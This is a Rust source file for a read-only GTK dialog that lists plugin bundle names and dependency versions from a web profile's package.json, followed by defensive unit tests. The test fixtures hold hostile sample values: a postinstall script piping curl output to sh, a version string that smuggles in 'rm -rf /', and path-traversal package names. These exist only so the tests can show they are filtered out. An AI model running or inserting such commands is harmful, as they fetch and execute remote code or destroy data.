//! Read-only overview of the installed web profile's plugins.
//!
//! Shows the plugin/bundle names and dependency versions declared in the profile's
//! `package.json` — filtered names and versions only, not arbitrary fields or
//! dependency URLs. This is not a general secret scrubber. No install/uninstall
//! action: managing plugins stays with DSH.
use std::io::Read;
use std::os::unix::fs::OpenOptionsExt;
use std::path::Path;

const MAX_PROFILE_BYTES: u64 = 1024 * 1024;

use gtk::prelude::*;
use serde::Serialize;
use tauri::{AppHandle, Manager};

pub const TITLE: &str = "DSH Ocean plugins";
pub const FAILURE_TEXT: &str =
    "Could not read the web profile's package.json. It must be readable, valid JSON, a regular non-symlink file and at most 1 MiB. Nothing was changed.";

/// Names and versions declared by the profile.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Inventory {
    pub bundles: Vec<String>,
    pub dependencies: Vec<(String, String)>,
}

impl Inventory {
    pub fn is_empty(&self) -> bool {
        self.bundles.is_empty() && self.dependencies.is_empty()
    }
}

/// Parses the declared plugin list out of a `package.json` document.
///
/// Only `dsh.profile.bundles` and `dependencies` are read, so nothing else in the
/// file (scripts, tokens, paths) can reach the window.
pub fn parse(text: &str) -> Result<Inventory, String> {
    if text.len() as u64 > MAX_PROFILE_BYTES {
        return Err(FAILURE_TEXT.to_owned());
    }
    let value: serde_json::Value = serde_json::from_str(text)
        .map_err(|_| "the profile package.json is not valid JSON".to_owned())?;
    let mut bundles: Vec<String> = value
        .pointer("/dsh/profile/bundles")
        .and_then(|bundles| bundles.as_array())
        .map(|bundles| {
            bundles
                .iter()
                .filter_map(|item| item.as_str())
                .filter(|name| valid_name(name))
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default();
    bundles.sort();
    bundles.dedup();
    let mut dependencies: Vec<(String, String)> = value
        .get("dependencies")
        .and_then(|deps| deps.as_object())
        .map(|deps| {
            deps.iter()
                .filter(|(name, _)| valid_name(name))
                .filter_map(|(name, version)| {
                    version
                        .as_str()
                        .filter(|version| valid_version(version))
                        .map(|version| (name.clone(), version.to_owned()))
                })
                .collect()
        })
        .unwrap_or_default();
    dependencies.sort();
    Ok(Inventory {
        bundles,
        dependencies,
    })
}

/// A plain npm name, or a scoped `@scope/name`; nothing that could be a path.
fn valid_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 214 || name.starts_with('.') {
        return false;
    }
    fn component(value: &str) -> bool {
        !value.is_empty()
            && !value.starts_with('.')
            && value
                .bytes()
                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
    }
    if let Some(scoped) = name.strip_prefix('@') {
        scoped
            .split_once('/')
            .is_some_and(|(scope, package)| component(scope) && component(package))
    } else {
        component(name)
    }
}

fn valid_version(version: &str) -> bool {
    !version.is_empty()
        && version.len() <= 64
        && version.chars().all(|character| {
            character.is_ascii_alphanumeric()
                || matches!(
                    character,
                    '.' | '-' | '+' | '^' | '~' | '*' | '=' | '<' | '>' | ' '
                )
        })
}

/// Reads the inventory from the web profile, if it exists.
pub fn inventory(profile: &Path) -> Result<Inventory, String> {
    let path = profile.join("package.json");
    let file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK)
        .open(&path)
        .map_err(|_| FAILURE_TEXT.to_owned())?;
    let metadata = file.metadata().map_err(|_| FAILURE_TEXT.to_owned())?;
    if !metadata.is_file() || metadata.len() > MAX_PROFILE_BYTES {
        return Err(FAILURE_TEXT.to_owned());
    }
    let mut text = String::new();
    file.take(MAX_PROFILE_BYTES + 1)
        .read_to_string(&mut text)
        .map_err(|_| FAILURE_TEXT.to_owned())?;
    parse(&text).map_err(|_| FAILURE_TEXT.to_owned())
}

/// Fixed rendering: counts, names and versions only.
pub fn text(inventory: &Inventory) -> String {
    use std::fmt::Write as _;
    if inventory.is_empty() {
        return "No plugins are declared in the web profile.\n\nDSH manages its own plugin set; this window only reports what the profile declares."
            .to_owned();
    }
    let mut output = String::new();
    let _ = writeln!(
        output,
        "{} bundle(s) and {} package dependency(ies) are declared by the web profile.\n",
        inventory.bundles.len(),
        inventory.dependencies.len()
    );
    if !inventory.bundles.is_empty() {
        output.push_str("Bundles:\n");
        for bundle in &inventory.bundles {
            let _ = writeln!(output, "  {bundle}");
        }
        output.push('\n');
    }
    if !inventory.dependencies.is_empty() {
        output.push_str("Packages:\n");
        for (name, version) in &inventory.dependencies {
            let _ = writeln!(output, "  {name} {version}");
        }
        output.push('\n');
    }
    output.push_str(
        "Read-only: names and versions only, never file contents or paths. Installing, \
         removing or updating plugins is DSH's job, not this window's.",
    );
    output
}

pub struct Window {
    pub dialog: gtk::Dialog,
    pub label: gtk::Label,
}

pub fn build(parent: Option<&gtk::Window>, body: &str) -> Window {
    let dialog = gtk::Dialog::with_buttons(
        Some(TITLE),
        parent,
        gtk::DialogFlags::MODAL,
        &[("Close", gtk::ResponseType::Close)],
    );
    dialog.set_default_size(620, 420);
    let label = gtk::Label::new(Some(body));
    label.set_use_markup(false);
    label.set_selectable(true);
    label.set_line_wrap(true);
    label.set_max_width_chars(78);
    label.set_xalign(0.0);
    label.set_yalign(0.0);
    label.set_margin_start(18);
    label.set_margin_end(18);
    label.set_margin_top(18);
    label.set_margin_bottom(18);
    let scroll = gtk::ScrolledWindow::new(None::<&gtk::Adjustment>, None::<&gtk::Adjustment>);
    scroll.set_policy(gtk::PolicyType::Automatic, gtk::PolicyType::Automatic);
    scroll.add(&label);
    dialog.content_area().pack_start(&scroll, true, true, 0);
    dialog.connect_response(|dialog, _| dialog.close());
    Window { dialog, label }
}

pub fn show(app: &AppHandle) {
    let parent = app
        .get_webview_window("main")
        .and_then(|window| window.gtk_window().ok());
    let body = match inventory(&crate::config::web_profile_dir()) {
        Ok(inventory) => text(&inventory),
        Err(message) => message,
    };
    let window = build(parent.as_ref().map(|window| window.upcast_ref()), &body);
    window.dialog.show_all();
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROFILE: &str = r#"{
        "name": "web",
        "dependencies": {
            "@deepseek/harness": "^1.2.3",
            "left-pad": "1.0.0",
            "../../escape": "1.0.0",
            "bad": {"version": "1.0.0"}
        },
        "dsh": { "profile": { "bundles": ["core", "core", "../evil", ".hidden"] } },
        "scripts": { "postinstall": "curl http://example.com | sh" }
    }"#;

    #[test]
    fn only_names_and_versions_are_extracted() {
        let inventory = parse(PROFILE).expect("valid profile");
        assert_eq!(inventory.bundles, vec!["core".to_owned()]);
        assert_eq!(
            inventory.dependencies,
            vec![
                ("@deepseek/harness".to_owned(), "^1.2.3".to_owned()),
                ("left-pad".to_owned(), "1.0.0".to_owned())
            ]
        );
        // A traversal name and a non-string version are dropped, and nothing from
        // `scripts` reaches the inventory.
        let rendered = text(&inventory);
        assert!(
            !rendered.contains("evil") && !rendered.contains("escape"),
            "{rendered}"
        );
        assert!(
            !rendered.contains("postinstall") && !rendered.contains("curl"),
            "{rendered}"
        );
        assert!(rendered.contains("@deepseek/harness ^1.2.3"), "{rendered}");
        assert!(rendered.contains("never file contents"), "{rendered}");
    }

    #[test]
    fn empty_or_broken_profiles_are_reported_without_details() {
        assert!(parse("{not json").is_err());
        let empty = parse("{}").expect("valid json");
        assert!(empty.is_empty());
        assert!(text(&empty).contains("No plugins are declared"));
        let failure = inventory(Path::new("/nonexistent-profile"));
        assert_eq!(failure, Err(FAILURE_TEXT.to_owned()));
    }

    #[test]
    fn metadata_reads_reject_large_symlinked_and_special_files() {
        use std::fs;
        use std::os::unix::ffi::OsStrExt;
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join(format!(
            "dsh-ocean-plugin-read-test-{}",
            crate::downloads::unique_id()
        ));
        fs::create_dir(&root).unwrap();
        let path = root.join("package.json");
        fs::write(&path, "{}").unwrap();
        assert!(inventory(&root).unwrap().is_empty());
        fs::OpenOptions::new()
            .write(true)
            .open(&path)
            .unwrap()
            .set_len(MAX_PROFILE_BYTES + 1)
            .unwrap();
        assert_eq!(inventory(&root), Err(FAILURE_TEXT.to_owned()));
        assert!(parse(&" ".repeat(MAX_PROFILE_BYTES as usize + 1)).is_err());
        assert_eq!(path, root.join("package.json"));
        fs::remove_file(&path).unwrap();
        let target = root.join("target.json");
        fs::write(&target, "{}").unwrap();
        symlink(&target, &path).unwrap();
        assert_eq!(inventory(&root), Err(FAILURE_TEXT.to_owned()));
        fs::remove_file(&path).unwrap();
        let fifo = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o600) }, 0);
        assert_eq!(inventory(&root), Err(FAILURE_TEXT.to_owned()));
        assert_eq!(root.parent(), Some(std::env::temp_dir().as_path()));
        assert!(root
            .file_name()
            .unwrap()
            .to_string_lossy()
            .starts_with("dsh-ocean-plugin-read-test-"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn package_names_reject_urls_controls_and_inline_secrets() {
        for name in [
            "token=secret",
            "https:example",
            "white space",
            "@scope/name/extra",
            "@/name",
            "name\\nsecret",
            "@scope/.hidden",
        ] {
            assert!(!valid_name(name), "accepted {name:?}");
        }
        for name in ["core", "left-pad", "@deepseek/harness", "a_b.c"] {
            assert!(valid_name(name), "rejected {name:?}");
        }
    }

    #[test]
    fn versions_are_restricted_to_version_like_text() {
        let inventory = parse(r#"{"dependencies":{"a":"1.0.0; rm -rf /","b":"1.2.3"}}"#).unwrap();
        assert_eq!(
            inventory.dependencies,
            vec![("b".to_owned(), "1.2.3".to_owned())]
        );
    }
}
